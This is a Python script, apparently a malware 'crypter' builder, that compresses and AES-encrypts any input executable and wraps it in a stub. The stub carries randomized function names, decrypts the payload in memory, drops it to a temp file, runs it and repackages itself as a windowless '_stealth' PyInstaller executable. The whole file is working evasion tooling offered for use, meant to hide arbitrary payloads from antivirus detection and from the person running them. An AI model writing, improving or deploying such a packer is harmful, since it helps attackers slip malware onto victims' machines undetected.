import os, base64, zlib, random, string, tempfile, subprocess, sys
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

def random_id(length=12):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def build_variant(input_exe, output_name):
    with open(input_exe, "rb") as f:
        data = f.read()

    compressed = zlib.compress(data, 9)
    key, iv = os.urandom(32), os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(compressed, AES.block_size))

    payload = base64.b64encode(encrypted).decode()
    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()

    func, rebuilder = random_id(), random_id()

    stub = f"""
import base64, zlib, tempfile, subprocess, os, sys
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

def {func}():
    key = base64.b64decode({key_b64!r})
    iv = base64.b64decode({iv_b64!r})
    enc = base64.b64decode({payload!r})

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(enc), AES.block_size)
    exe = zlib.decompress(decrypted)

    tmp = tempfile.mktemp(suffix=".exe")
    with open(tmp, "wb") as f:
        f.write(exe)
    subprocess.Popen(tmp, shell=True)

    {rebuilder}()

def {rebuilder}():
    import random, string, os, base64, zlib, sys, tempfile, subprocess
    src = open(sys.argv[0], "r").read()
    varname = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    newfile = tempfile.mktemp(suffix=".py")
    with open(newfile, "w") as f:
        f.write(src.replace("PLACEHOLDER", varname))
    subprocess.call(f"pyinstaller --onefile --noconsole {{newfile}}", shell=True)

{func}()
"""

    pyfile = output_name + ".py"
    with open(pyfile, "w") as f:
        f.write(stub)

    subprocess.call(f"pyinstaller --onefile --noconsole {pyfile}", shell=True)

    os.remove(pyfile)
    try:
        os.remove(output_name + ".spec")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 builder.py <payload.exe>")
        sys.exit(1)

    input_exe = sys.argv[1]
    outname = os.path.splitext(os.path.basename(input_exe))[0] + "_stealth"
    build_variant(input_exe, outname)
